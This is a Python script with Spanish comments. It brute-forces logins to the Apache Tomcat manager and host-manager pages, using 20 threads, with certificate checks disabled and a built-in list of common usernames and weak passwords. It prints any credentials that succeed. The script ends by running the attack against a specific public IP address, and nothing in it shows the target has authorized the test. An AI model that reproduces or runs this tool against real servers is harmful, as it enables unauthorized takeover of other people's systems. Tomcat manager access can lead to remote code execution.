import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedBruteForcer:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.urls = [
            f"https://{target_ip}/manager/html",
            f"https://{target_ip}/host-manager/html"
        ]

    def load_wordlist(self):
        """Carga wordlist mejorada"""
        # Usuarios comunes
        users = ["admin", "tomcat", "root", "manager", "administrator", "test", "user"]
        
        # Contraseñas extensas
        passwords = [
            "admin", "tomcat", "password", "123456", "admin123", "tomcat123",
            "Passw0rd", "Admin123", "Tomcat2024", "tomcat2024", "admin2024",
            "password123", "1234", "12345", "123456789", "qwerty", "abc123",
            "password1", "12345678", "111111", "1234567", "sunshine", "654321",
            "admin@123", "Tomcat!", "tomcat!", "Admin!", "P@ssw0rd", "P@ssword123"
        ]
        
        return [(u, p) for u in users for p in passwords]

    def try_login(self, credential_data):
        """Intenta login con credenciales"""
        url, username, password = credential_data
        try:
            response = requests.get(url, auth=(username, password), verify=False, timeout=10)
            if response.status_code == 200:
                if "Tomcat" in response.text:
                    return True, url, username, password
        except:
            pass
        return False, None, None, None

    def brute_force_advanced(self):
        """Fuerza bruta avanzada con múltiples hilos"""
        print("[*] Iniciando fuerza bruta avanzada...")
        
        credentials = self.load_wordlist()
        tasks = []
        
        for url in self.urls:
            for username, password in credentials:
                tasks.append((url, username, password))
        
        found = False
        with ThreadPoolExecutor(max_workers=20) as executor:
            results = executor.map(self.try_login, tasks)
            
            for success, url, user, pwd in results:
                if success:
                    print(f"\n[!] ¡CREDENCIALES ENCONTRADAS!")
                    print(f"    URL: {url}")
                    print(f"    Usuario: {user}")
                    print(f"    Contraseña: {pwd}")
                    found = True
                    break
        
        if not found:
            print("[-] No se encontraron credenciales válidas")

# Ejecutar fuerza bruta
brute_forcer = AdvancedBruteForcer("189.254.143.102")
brute_forcer.brute_force_advanced()